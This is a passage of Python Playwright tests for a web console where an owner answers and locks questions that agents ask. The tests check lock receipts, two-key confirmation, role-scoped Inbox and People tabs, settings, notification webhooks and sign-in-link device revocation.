                page.wait_for_selector(".ck-question:has-text('Question 4')", timeout=6000)
                self.assertEqual(page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-receipt").count(), 1)
                page.click(".ck-q-line[data-qid='LANE.1/Q1']")
                page.wait_for_selector(".ck-question-rolled[data-qid='LANE.1/Q1']")

    def test_the_receipt_says_who_locked_it(self):
        # Catches (1.38.1): the card never reading `view.locked_by`, so who decided shows in the Feed only;
        # and a "Locked by" line on a lock the console kept no login for (cron, an older lock).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.ask(2)
                self.answer("LANE.1/Q1", pick="record")
                self.answer("LANE.1/Q2", pick="record")
                self.console.act_as("ivan@example.com")   # as the owner gate does for a signed-in request
                try:
                    self.lock("LANE.1/Q1")
                finally:
                    self.console.act_as(None)
                self.lock("LANE.1/Q2")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                for qid in ("LANE.1/Q1", "LANE.1/Q2"):
                    page.click(f".ck-q-line[data-qid='{qid}']")
                    page.wait_for_selector(f".ck-question[data-qid='{qid}'] .ck-receipt")
                by = page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-receipt-by")
                self.assertEqual(by.text_content(), "Locked by ivan@example.com")
                self.assertEqual(page.locator(".ck-question[data-qid='LANE.1/Q2'] .ck-receipt-by").count(), 0)

    def test_a_two_key_lock_waits_on_the_card_until_a_second_person_confirms(self):
        # Catches (1.43.0, W6): the card locking at once in a two-key area, offering the first key's holder a
        # second press (one person as both keys), never saying whose key waits, and a receipt that names only
        # whoever wrote the lock record.
        from overture import roles as RO
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                RO.set_role(self.cfg.state, "owner@example.com", "owner")
                RO.set_role(self.cfg.state, "bob@example.com", "owner")
                RO.set_two_key(self.cfg.state, ["LANE"])
                self.ask(1)
                self.answer("LANE.1/Q1", pick="record")
                page = self.page(kind, 1280, url)
                self.open_item(page)   # an answered, unlocked question is drawn open: no line to click
                page.wait_for_selector("text=Two-key area: a lock here counts once a second person confirms it.")
                page.click(".ck-question[data-qid='LANE.1/Q1'] .ck-lock-one")
                page.wait_for_selector("text=You locked this: waiting for a second person to confirm.")
                self.assertEqual(page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-lock-one").count(), 0)
                self.assertEqual(self.locks(), [])
                head = self.console.store.head("LANE.1/Q1")
                self.console.act_as("bob@example.com")   # the second person, as the owner gate sets it
                try:
                    self.assertEqual(self.console.lock({"qid": "LANE.1/Q1", "answer": head["id"],
                                                        "nonce": "bobkey0001"})["confirmed"], "owner@example.com")
                finally:
                    self.console.act_as(None)
                self.assertEqual(len(self.locks()), 1)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.click(".ck-q-line[data-qid='LANE.1/Q1']")
                by = page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-receipt-by")
                by.wait_for()
                self.assertEqual(by.text_content(), "Locked by owner@example.com, confirmed by bob@example.com")
                # (review) The other side: someone else's key waits, the page names them and offers Confirm lock.
                self.ask(2)
                self.answer("LANE.1/Q2", pick="record")
                self.console.act_as("bob@example.com")
                try:
                    self.console.lock({"qid": "LANE.1/Q2", "answer": self.console.store.head("LANE.1/Q2")["id"],
                                       "nonce": "bobkey0002"})
                finally:
                    self.console.act_as(None)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.wait_for_selector("text=bob@example.com locked this. It needs a second person: confirm to lock it.")
                page.click(".ck-question[data-qid='LANE.1/Q2'] .ck-lock-one:has-text('Confirm lock')")
                _wait_for(page, "() => document.querySelector('.ck-live').textContent.includes('second key')")
                self.assertEqual(len(self.locks()), 2)

    def test_a_member_sees_their_role_above_the_inbox(self):
        # Catches (1.39.0): `view.you` never rendered, so a member learns their limits only from refused
        # clicks; and the line shown on a console with no roles, where every login is the owner.
        from overture import roles as RO
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                page = self.page(kind, 1280, url)
                self.open_item(page)   # where a member answers; the line sits under its status bar
                self.assertEqual(page.locator(".ck-your-role").count(), 0)
                # The page's token is owner@example.com's: make that login a member.
                (self.cfg.state / RO.FILE).write_text(json.dumps({"roles": {
                    "boss@example.com": {"role": "owner"},
                    "owner@example.com": {"role": "member", "areas": ["LANE"]}}}))
                page = self.page(kind, 1280, url)
                drafts = []
                page.on("request", lambda r: drafts.append(r.url) if "/api/draft" in r.url else None)
                self.open_item(page)
                line = page.wait_for_selector(".ck-your-role")
                self.assertIn("member here: you can answer, lock and message in LANE", line.text_content())
                # Catches (review): the member's typing autosaved to /api/draft, which refuses it, so the
                # box says "Draft not saved" on every pause. Their words stay in the tab instead.
                page.fill(".ck-question[data-qid='LANE.1/Q1'] .ck-textarea", "my own words")   # open: unanswered
                page.wait_for_timeout(2500)   # past the page's 1.5 s autosave pause
                self.assertEqual(drafts, [])

    def test_a_members_inbox_opens_on_mine_and_an_administrator_sees_who_each_is_for(self):
        # Catches (1.41.0, W1–W3): the Inbox showing a member every question with no way to narrow it; a
        # "Mine" that ignores parents (LANE.1 sits under LANE); and an administrator who cannot see which
        # member a question is for.
        from overture import roles as RO
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1, item="LANE")
                self.ask(2, item="LANE.1")
                RO.set_role(self.cfg.state, "boss@example.com", "owner")
                RO.set_role(self.cfg.state, "owner@example.com", "member", ["LANE.1"])   # the page's login
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.wait_for_selector(".ck-inbox-scope")
                rows = lambda: sorted(page.eval_on_selector_all(   # noqa: E731
                    ".ck-inbox-item[data-qid]", "els => els.map(e => e.dataset.qid)"))
                self.assertEqual(rows(), ["LANE.1/Q2"])
                self.assertIn("For you", page.locator(".ck-inbox-item[data-qid='LANE.1/Q2']").text_content())
                page.click(".ck-scope-all")
                _wait_for(page, "document.querySelectorAll('.ck-inbox-item[data-qid]').length === 2")
                # An administrator: no switch (Mine is everything), and each row names its member.
                RO.set_role(self.cfg.state, "owner@example.com", "owner")
                RO.set_role(self.cfg.state, "bob@example.com", "member", ["LANE"])
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.wait_for_selector(".ck-inbox-item[data-qid='LANE.1/Q2'] .ck-q-for")
                self.assertEqual(page.locator(".ck-inbox-scope").count(), 0)
                self.assertEqual(page.locator(".ck-inbox-item[data-qid='LANE.1/Q2'] .ck-q-for").text_content(),
                                 "For bob@example.com")
                self.assertEqual(page.locator(".ck-inbox-item[data-qid='LANE/Q1'] .ck-q-for").text_content(),
                                 "For bob@example.com")
                # A member whose areas hold no question: a line pointing at All, never a blank Inbox (review).
                RO.set_role(self.cfg.state, "owner@example.com", "member", ["ELSEWHERE"])
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.click(".ck-mine-empty button")
                _wait_for(page, "document.querySelectorAll('.ck-inbox-item[data-qid]').length === 2")

    def test_the_people_tab_claims_the_administrator_then_adds_a_member(self):
        # Catches (1.40.0): no way to turn roles on from the console (the claim button wired to nothing),
        # the add form posting no areas, and the tab shown to a login the server sent no list.
        from overture import roles as RO
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('people')")
                page.click(".ck-people-claim")
                page.wait_for_selector(".ck-people-row[data-email='owner@example.com']")
                self.assertEqual(RO.load(self.cfg.state), {"owner@example.com": {"role": "owner"}})
                self.assertIn("(you)", page.locator(".ck-people-row[data-email='owner@example.com']").text_content())
                page.fill(".ck-people-new-email", "bob@example.com")
                page.fill("#ck-people-new-areas", "LANE, LANE.1")
                page.click(".ck-people-add button[type='submit']")
                page.wait_for_selector(".ck-people-row[data-email='bob@example.com']")
                self.assertEqual(RO.load(self.cfg.state)["bob@example.com"],
                                 {"role": "member", "areas": ["LANE", "LANE.1"]})
                # The page's own login made a viewer by another administrator: no People tab for it.
                RO.set_role(self.cfg.state, "boss@example.com", "owner")
                RO.set_role(self.cfg.state, "owner@example.com", "viewer")
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('people')")
                page.wait_for_selector("text=Only an administrator manages people.")
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.click(".ck-rail-btn[data-section='team']")   # People lives in Team (1.48, U1)
                page.wait_for_selector("#ck-tab-chat")
                self.assertEqual(page.locator("#ck-tab-people").count(), 0)

    def test_a_director_sets_a_limit_and_a_short_name_and_sees_the_two_key_areas_read_only(self):
        # Catches (1.44.0): the Settings tab never shown to a director (or shown to any viewer), a Save posting
        # nothing or the text "3", the short-name form wired to nothing, and the changes not drawn with "You".
        # (1.46.0, L10 amends S1) a director offered the two-key form, which the server now refuses: they see
        # the areas and who changes them instead.
        from overture import operators as OP
        from overture import roles as RO
        from overture import settings as SET
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                RO.set_role(self.cfg.state, "boss@example.com", "owner")
                RO.set_role(self.cfg.state, "owner@example.com", "viewer", director=True)   # the page's login
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.click(".ck-rail-btn[data-section='team']")
                page.click("#ck-tab-settings")
                self.assertEqual(page.locator("#ck-tab-people").count(), 0)
                page.fill("#ck-setting-chat_per_minute", "3")
                page.click(".ck-settings-row[data-key='chat_per_minute'] button:has-text('Save')")
                page.wait_for_selector(".ck-settings-row[data-key='chat_per_minute'] >> text=set here; the default is 6")
                self.assertEqual(SET.load(self.cfg.state), {"chat_per_minute": 3})
                self.assertEqual(page.locator(".ck-two-key-form").count(), 0)
                self.assertEqual(page.locator(".ck-two-key-readonly").text_content(),
                                 "No two-key areas. Only an administrator changes these.")
                page.fill(".ck-settings-name-add input[type='email']", "bob@example.com")
                page.fill(".ck-settings-name-add input[type='text']", "bob")
                page.click(".ck-settings-name-add button[type='submit']")
                page.wait_for_selector(".ck-settings-row[data-email='bob@example.com']")
                self.assertEqual(OP.load_names(self.cfg.state), {"bob@example.com": "bob"})
                log = page.locator(".ck-people-log").text_content()
                self.assertIn("You set Chat messages a minute to 3 (was the default)", log)
                self.assertIn("You set the short name of bob@example.com to bob", log)
                # A plain viewer: no Settings tab, and #settings says why.
                RO.set_role(self.cfg.state, "owner@example.com", "viewer")
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('settings')")
                page.wait_for_selector("text=Only an administrator or a director changes settings.")
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.click(".ck-rail-btn[data-section='team']")
                page.wait_for_selector("#ck-tab-chat")
                self.assertEqual(page.locator("#ck-tab-settings").count(), 0)

    def test_settings_turns_notifications_on_and_shows_the_webhook_by_host_only(self):
        # Catches (1.45.0): the Notifications section never drawn, the switch or the quiet hours posting
        # nothing, the webhook's secret path on the page, and no word of how to set one when none is set.
        from overture import notify as NT
        from overture import settings as SET
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('settings')")
                page.wait_for_selector(".ck-settings-notify-where >> text=No webhook yet")
                self.assertIn("agent.py notify-url", page.locator(".ck-settings-notify-where").text_content())
                NT.set_url(self.cfg.state, "https://hooks.example.com/services/T0/B0/SECRETPATHxyz")
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('settings')")
                page.wait_for_selector(".ck-settings-notify-where >> text=hooks.example.com")
                self.assertNotIn("SECRETPATH", page.content())
                page.check("#ck-setting-notify_on")
                _wait_for(page, "() => document.querySelector('.ck-live').textContent.includes('Notifications on')")
                self.assertIs(SET.load(self.cfg.state)["notify_on"], True)
                row = ".ck-settings-row[data-key='notify_quiet']"
                page.fill(row + " input[aria-label='Quiet from']", "21:00")
                page.fill(row + " input[aria-label='Quiet until']", "06:30")
                page.click(row + " button:has-text('Save')")
                page.wait_for_selector(row + " button:has-text('No quiet hours')")
                self.assertEqual(SET.load(self.cfg.state)["notify_quiet"], {"from": "21:00", "to": "06:30"})
                self.assertIn("set the quiet hours to 21:00–06:30", page.locator(".ck-people-log").text_content())

    def test_the_people_tab_shows_who_changed_whose_role_newest_first(self):
        # Catches (1.42.0, W5): the log sent but never drawn, drawn oldest first, a console change not shown
        # as "You", and a terminal change credited to a login rather than to `agent.py access`.
        from overture import roles as RO
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('people')")
                page.click(".ck-people-claim")
                page.wait_for_selector(".ck-people-log-row")
                page.fill(".ck-people-new-email", "bob@example.com")
                page.fill("#ck-people-new-areas", "LANE")
                page.click(".ck-people-add button[type='submit']")
                page.wait_for_selector(".ck-people-log-row >> nth=1")
                RO.set_role(self.cfg.state, "bob@example.com", "viewer")
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('people')")
                page.wait_for_selector(".ck-people-log-row >> nth=2")
                rows = page.locator(".ck-people-log-row").all_text_contents()
                self.assertIn("agent.py access changed bob@example.com from member of LANE to viewer", rows[0])
                self.assertIn("You added bob@example.com as member of LANE", rows[1])
                self.assertIn("You added owner@example.com as administrator", rows[2])

    def test_q37_a_stale_question_stays_whole(self):
        # Catches: rolling up every question with a lock, so a stale ruling (which needs the owner) hides.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                spec = self.cfg.root / "docs" / "spec.md"
                spec.parent.mkdir(parents=True)
                spec.write_text("The cap is 64 KiB.\n")
                self.ask(1, valid_if=[{"kind": "excerpt", "path": "docs/spec.md", "text": "The cap is 64 KiB."}])
                self.answer("LANE.1/Q1")
                self.lock("LANE.1/Q1")
                spec.write_text("The cap is 32 KiB.\n")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.wait_for_selector(".ck-stale-banner")
                self.assertEqual(page.locator(".ck-question-rolled").count(), 0)

    # -- Q36: the send bar -------------------------------------------------------------

    def test_q36_the_send_bar_counts_sends_the_process_signal_and_goes(self):
        # Catches: a bar shown before any answer; counts that are not answered/left; a bar under a host's
        # sticky header or scrolled away with the questions; a different signal from today's button (another
        # text or intent); two send controls at once; and a bar that stays after the send.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve(page=STICKY_HOST)
                    for n in (1, 2, 3):
                        self.ask(n)
                    page = self.page(kind, width, url)
                    self.open_item(page)
                    self.assertEqual(page.locator(".ck-send-bar").count(), 0, "a bar before any answer")
                    self.answer("LANE.1/Q1")
                    page.wait_for_selector(".ck-send-bar", timeout=6000)
                    self.assertEqual(page.locator(".ck-send-bar-count").text_content(), "1 answered · 2 left")
                    self.answer("LANE.1/Q2", pick="leave")
                    _wait_for(page, "document.querySelector('.ck-send-bar-count').textContent === "
                                           "'2 answered · 1 left'", timeout=6000)
                    self.assertEqual(page.get_by_role("button", name="Answers are in: process them").count(), 0)
                    # Under the panel's header, never covered: what is drawn at its centre is the bar.
                    page.evaluate("document.querySelector('.ck-body').scrollTop = 99999; window.scrollTo(0, 400)")
                    geo = page.evaluate("""() => {
                        const b = document.querySelector('.ck-send-bar').getBoundingClientRect();
                        const h = document.querySelector('.ck-panel .ck-header').getBoundingClientRect();
                        const hit = document.elementFromPoint(b.left + 8, b.top + b.height / 2);
                        return {below: b.top >= h.bottom - 1, top: b.top, mine: !!hit.closest('.ck-send-bar')};
                    }""")
                    self.assertTrue(geo["below"], geo)
                    self.assertTrue(geo["mine"], f"something covers the bar: {geo}")
                    self.assertLess(geo["top"], 200, geo)
                    self.assertEqual([b for b in self.bell() if b.get("intent") == "process"], [])
                    page.click(".ck-send-bar-go")
                    _wait_for(page, "document.querySelector('.ck-send-bar') === null", timeout=6000)
                    sent = [r for r in self.console.store.records()
                            if r["type"] == "message" and r.get("intent") == "process"]
                    self.assertEqual([(r["item"], r["text"], r["by"]) for r in sent],
                                     [("LANE.1", "Answers are in: process them.", "owner")])
                    self.assertEqual(len([b for b in self.bell() if b.get("intent") == "process"]), 1)
                    self.said(page, "Sent to the agent")
                    self.assertFalse(page.evaluate("document.activeElement === document.body"))
                    # The next answer brings it back, counting only what came after the send.
                    self.answer("LANE.1/Q3")
                    _wait_for(page, "document.querySelector('.ck-send-bar-count') && document.querySelector("
                                           "'.ck-send-bar-count').textContent === '1 answered · 0 left'", timeout=6000)

    # -- Q34: a single pick moves on ----------------------------------------------------

    def round_of(self, kinds):
        f = self.console.write("message", {"item": "LANE.1", "text": "go", "intent": "fork", "mode": "explore",
                                           "nonce": "uxfork0001"}, "owner")
        for n, k in enumerate(kinds, 1):
            self.ask(n, forked_from=f["id"], star_by="panel", kind=k)
        return f["id"]

    def test_q34_a_single_pick_moves_to_the_next_unanswered_question_and_says_so(self):
        # Catches: no move at all; a move to the next question even when it is already picked (it must be the
        # next UNANSWERED one); a move that is not announced; a move after a multi-choice pick, after a pick
        # on a question being commented on, or for every ↑/↓ step through the options (each is a change);
        # and a move onto the review page, whose Lock button an Enter would then press.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                fid = self.round_of(["single", "single", "multi", "single", "single"])
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openRound(%s)" % json.dumps(fid))
                page.wait_for_selector(".ck-round-step")
                count = "document.querySelector('.ck-round-count').textContent"
                at = lambda n: page.evaluate(count + f".startsWith('Question {n} of 5')")
                page.click(".ck-round-dot >> nth=1")   # pick Q2 first: it moves on to Q3, the next unanswered
                _wait_for(page, count + ".startsWith('Question 2 of 5')")
                # An ↑/↓ that changed nothing (its default prevented) must not make the next click a "walk".
                page.eval_on_selector(".ck-round-options input[value='fix']", """r => {
                    for (const type of ['keydown', 'keyup'])
                        r.dispatchEvent(new KeyboardEvent(type, {key: 'ArrowDown', bubbles: true}));
                }""")
                page.click(".ck-round-options input[value='leave']")
                _wait_for(page, count + ".startsWith('Question 3 of 5')", timeout=3000)
                page.click(".ck-round-dot >> nth=0")
                _wait_for(page, count + ".startsWith('Question 1 of 5')")
                page.click(".ck-round-options input[value='fix']")
                # Q2 is picked already: the next UNANSWERED is Q3.
                _wait_for(page, count + ".startsWith('Question 3 of 5')", timeout=3000)
                self.said(page, "Moved on to question 3 of 5")
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-round-qtext')"))
                # Q3 is multi: a pick never moves (Q4 and Q5 are still open, so a move had somewhere to go).
                page.click(".ck-round-options input[value='fix']")
                page.wait_for_timeout(900)
                self.assertTrue(at(3))
                page.click(".ck-round-dot >> nth=3")
                _wait_for(page, count + ".startsWith('Question 4 of 5')")
                # A step change puts focus on the question text in the next animation frame: wait for that, or
                # it lands after the radio is focused below and the ↓ goes to the heading (a flake, 1 in 4).
                _wait_for(page, "document.activeElement && document.activeElement.classList.contains("
                                       "'ck-round-qtext')")
                # ↑/↓ walk Q4's options without moving on, though Q5 is open.
                page.locator(".ck-round-options input[value='fix']").focus()
                _wait_for(page, "document.activeElement && document.activeElement.value === 'fix'")
                page.keyboard.press("ArrowDown")
                _wait_for(page, "document.querySelector(\".ck-round-options input[value='record']\").checked")
                page.wait_for_timeout(900)   # ADVANCE_MS is 400: a move would have happened by now
                self.assertTrue(at(4))
                # Commenting on Q4, then a pick: it stays.
                page.fill("#ck-round-words", "thinking about it")
                page.click(".ck-round-options input[value='leave']")
                page.wait_for_timeout(900)
                self.assertTrue(at(4))
                page.click(".ck-round-dot >> nth=4")
                _wait_for(page, count + ".startsWith('Question 5 of 5')")
                # Every question picked now: a pick moves nowhere, and never onto the review page.
                page.click(".ck-round-options input[value='fix']")
                self.said(page, "Every question has a pick")
                page.wait_for_timeout(600)
                self.assertTrue(at(5))
                self.assertEqual(page.locator(".ck-review-heading").count(), 0)
                self.assertEqual(self.console.store.head("LANE.1/Q1"), None, "a pick wrote something")

    # -- Q35: loose questions from one agent, together -----------------------------------

    def test_q35_one_agents_loose_questions_on_one_item_are_offered_together(self):
        # Catches: grouping by item alone (two agents' questions merged), grouping unnamed questions (nothing
        # shows they are one agent's), a group spanning a long gap, a card that opens something other than
        # the round form, and a group lock that skips the owner door (it must be /answer then /lock, then
        # one 'process' message), or that locks before the owner presses its Lock.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask_as(1, "agent-5", at="2026-10-02T10:00:00Z")
                self.ask_as(2, "agent-5", at="2026-10-02T10:03:00Z")
                self.ask_as(3, "agent-5", at="2026-10-02T10:06:00Z")
                self.ask_as(4, "agent-5", at="2026-10-02T11:30:00Z")   # after a long gap: alone
                self.ask_as(5, "agent-6", at="2026-10-02T10:04:00Z")   # another agent
                self.ask_as(6, None, at="2026-10-02T10:05:00Z")        # no name
                self.ask_as(7, None, at="2026-10-02T10:05:30Z")
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                cards = page.locator(".ck-cluster")
                self.assertEqual(cards.count(), 1)
                self.assertEqual(cards.locator(".ck-cluster-go").text_content(), "Answer these 3 together")
                self.assertEqual(cards.locator(".ck-inbox-item").evaluate_all("rs => rs.map(r => r.dataset.qid)"),
                                 ["LANE.1/Q1", "LANE.1/Q2", "LANE.1/Q3"])
                self.assertIn("agent-5", cards.locator(".ck-cluster-head").text_content())
                cards.locator(".ck-cluster-go").click()
                page.wait_for_selector(".ck-round-step")
                self.assertIn("Together: LANE.1", page.locator(".ck-round-title").text_content())
                self.assertTrue(page.evaluate("document.querySelector('.ck-round-count').textContent"
                                              ".startsWith('Question 1 of 3')"))
                for _ in range(3):
                    page.keyboard.press("2")
                    page.wait_for_timeout(600)
                page.get_by_role("button", name="Review all").click()
                page.wait_for_selector(".ck-review-heading")
                self.assertEqual(self.locks(), [], "locked before the owner pressed Lock")
                page.click(".ck-lock-all")
                page.wait_for_selector(".ck-result-heading", timeout=10000)
                for n in (1, 2, 3):
                    head = self.console.store.head(f"LANE.1/Q{n}")
                    self.assertEqual((head["picks"], head["by"]), (["record"], "owner"))
                    self.assertTrue(self.locked(f"LANE.1/Q{n}"))
                for n in (4, 5, 6, 7):
                    self.assertIsNone(self.console.store.head(f"LANE.1/Q{n}"))
                self.assertEqual(len([b for b in self.bell() if b.get("intent") == "process"]), 1)

    # -- Q38 (console half): motion only without a reduced-motion preference ---------------

    def test_q38_motion_runs_only_when_the_viewer_has_not_asked_for_less(self):
        # Catches: animation that ignores prefers-reduced-motion, and the send bar's slide never wired.
        for kind in BROWSERS:
            for reduced in (False, True):
                with self.subTest(browser=kind, reduced=reduced):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, 1280, url, reduced=reduced)
                    self.open_item(page)
                    self.answer("LANE.1/Q1")
                    page.wait_for_selector(".ck-send-bar", timeout=6000)
                    name = page.evaluate("getComputedStyle(document.querySelector('.ck-send-bar')).animationName")
                    self.assertEqual(name, "none" if reduced else "ck-slide-down")

    def test_settings_keeps_unsaved_typing_and_focus_through_a_redraw(self):
        # Catches (1.46.0, L12, a 1.45 LOW): a Settings redraw (a live change, or a Save on another row) building
        # every box from the server's values, so a number typed and not yet saved is lost, and the focus with it;
        # and a draft kept past its own Save or Reset (the box then lies about what is set).
        from overture import roles as RO
        from overture import settings as SET
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('settings')")
                minute = page.locator("#ck-setting-chat_per_minute")
                minute.fill("4")                                   # typed, not saved
                page.fill("#ck-setting-chat_per_hour", "50")
                page.click(".ck-settings-row[data-key='chat_per_hour'] button:has-text('Save')")
                page.wait_for_selector(".ck-settings-row[data-key='chat_per_hour'] >> text=set here; the default is 60")
                self.assertEqual(SET.load(self.cfg.state), {"chat_per_hour": 50})
                self.assertEqual(minute.input_value(), "4")
                minute.fill("42")                                  # still in the box when the page redraws
                page.evaluate("ConsoleKit.refresh()")
                _wait_for(page, "() => document.activeElement && document.activeElement.id === 'ck-setting-chat_per_minute'")
                self.assertEqual(minute.input_value(), "42")
                minute.fill("5")
                page.click(".ck-settings-row[data-key='chat_per_minute'] button:has-text('Save')")
                page.wait_for_selector(".ck-settings-row[data-key='chat_per_minute'] >> text=set here; the default is 6")
                page.click(".ck-settings-row[data-key='chat_per_minute'] button:has-text('Reset')")
                page.wait_for_selector(".ck-settings-row[data-key='chat_per_minute'] >> text=the default (1 to 60)")
                self.assertEqual(minute.input_value(), "6")        # the draft went with its own Save
                # An administrator (roles off: every login) still has the two-key form, and its typing is kept too.
                RO.set_role(self.cfg.state, "owner@example.com", "owner")
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('settings')")
                page.fill("#ck-two-key-areas", "LANE")
                page.evaluate("ConsoleKit.refresh()")
                self.assertEqual(page.locator("#ck-two-key-areas").input_value(), "LANE")
                page.click(".ck-two-key-form button[type='submit']")
                _wait_for(page, "() => document.querySelector('.ck-live').textContent.includes('Two-key areas: LANE')")
                self.assertEqual(RO.two_key_areas(self.cfg.state), ["LANE"])


class SigninLinkBrowserTests(unittest.TestCase):
    """1.46.0 (L1 L2): a console with --auth link, in a real browser, with no Access anywhere."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)

    def serve_link(self):
        import socket
        import tempfile
        from unittest import mock
        from overture import devices as DV
        from overture import server as SV
        from test_server import page_body
        td = tempfile.mkdtemp(prefix="ck-link-")
        self.addCleanup(lambda: __import__("shutil").rmtree(td, ignore_errors=True))
        env = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(Path(td) / "cfg")})
        env.start()
        self.addCleanup(env.stop)
        with socket.socket() as s:   # the console's origin names its port, so pick one first
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        root = Path(td)
        cfg = SV.Config(root=root, page=None, state=root / "state", adapter=root / "unused.py", team_domain="",
                        aud="", hostname="", port=port, project="link-test", auth="link",
                        origin=f"http://127.0.0.1:{port}")
        console = SV.Console(cfg, _LiveAdapter())
        console.publish_page({"commit": console.push_page_snapshot(page_body(LIVE_HOST))["staged"]})
        owner = SV.owner_server(console, SV.link_verifier(cfg), port)
        threading.Thread(target=owner.serve_forever, daemon=True).start()
        self.addCleanup(owner.server_close)
        self.addCleanup(owner.shutdown)
        self.DV, self.cfg = DV, cfg
        return f"http://127.0.0.1:{port}/"

    def test_sign_in_by_link_then_people_lists_the_browser_and_revoke_signs_it_out(self):
        # Catches: a link page whose button does not sign the browser in (the cookie never set, or set on a path
        # the console does not send it to), a console that does not load on the cookie, People with no Devices
        # section or no hint how to invite, a Revoke that goes without an in-page confirm (or with a browser
        # dialog), a confirm that does not warn this page signs out, and a revoked browser still let in.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve_link()
                tok = self.DV.invite(self.cfg.devices_file, "owner@example.com", self.cfg.state)[0]
                other = self.DV.invite(self.cfg.devices_file, "bob@example.com", self.cfg.state)[0]
                self.DV.redeem(self.cfg.devices_file, other, "Chrome on Android", self.cfg.state)
                browser = getattr(self.pw, kind).launch()
                self.addCleanup(browser.close)
                page = browser.new_context().new_page()
                errors, dialogs = [], []
                page.on("pageerror", lambda e: errors.append(str(e)))
                page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))
                page.goto(url)
                page.wait_for_selector("text=This browser is not signed in to this console.")
                page.goto(url + "signin?t=" + tok)
                page.wait_for_selector("text=Sign this browser in as owner@example.com?")
                page.click("button:has-text('Sign this browser in')")
                page.wait_for_url(url)
                _wait_for(page, "document.querySelector('.ck-inbox-count') && "
                                "document.querySelector('.ck-inbox-count').textContent !== '✉'")
                page.evaluate("ConsoleKit.openTab('people')")
                page.wait_for_selector(".ck-devices-hint >> text=agent.py invite EMAIL")
                rows = page.locator(".ck-device-row")
                self.assertEqual(rows.count(), 2)
                mine = page.locator(".ck-device-row", has_text="(this browser)")
                self.assertIn("owner@example.com", mine.text_content())
                self.assertIn(" · signed in ", mine.text_content())
                self.assertIn("Chrome on Android", page.locator(".ck-device-row", has_text="bob@").text_content())
                mine.locator(".ck-device-revoke").click()
                page.wait_for_selector(".ck-device-ask >> text=You are using it: this page signs out at once.")
                self.assertEqual(len(self.DV.listing(self.cfg.devices_file)), 2)   # asked, not yet done
                page.click(".ck-device-confirm")
                page.wait_for_selector("text=This browser is signed out.")
                self.assertEqual([d["email"] for d in self.DV.listing(self.cfg.devices_file)], ["bob@example.com"])
                status = page.evaluate("fetch('/api/view', {credentials: 'same-origin'}).then(r => r.status)")
                self.assertEqual(status, 403)
                self.assertEqual(dialogs, [])
                self.assertEqual(errors, [])

    def test_people_in_link_mode_speaks_of_sign_in_links_and_the_log_reads_as_sentences(self):
        # Catches (U4): link-mode People telling the owner about an "Access policy" and an "Access login" that a
        # link console does not have, a panel titled "Inbox" on People, and a role log reading
        # "agent.py invite invited bob@…" instead of a sentence.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve_link()
                tok = self.DV.invite(self.cfg.devices_file, "owner@example.com", self.cfg.state)[0]
                self.DV.invite(self.cfg.devices_file, "bob@example.com", self.cfg.state)
                browser = getattr(self.pw, kind).launch()
                self.addCleanup(browser.close)
                page = browser.new_context().new_page()
                page.goto(url + "signin?t=" + tok)
                page.click("button:has-text('Sign this browser in')")
                page.wait_for_url(url)
                _wait_for(page, "document.querySelector('.ck-inbox-count') && "
                                "document.querySelector('.ck-inbox-count').textContent !== '✉'")
                page.evaluate("ConsoleKit.openTab('people')")
                page.wait_for_selector(".ck-people-off")
                self.assertEqual(page.text_content(".ck-panel .ck-header .ck-title"), "People")
                text = page.text_content(".ck-panel #ck-tabpanel")
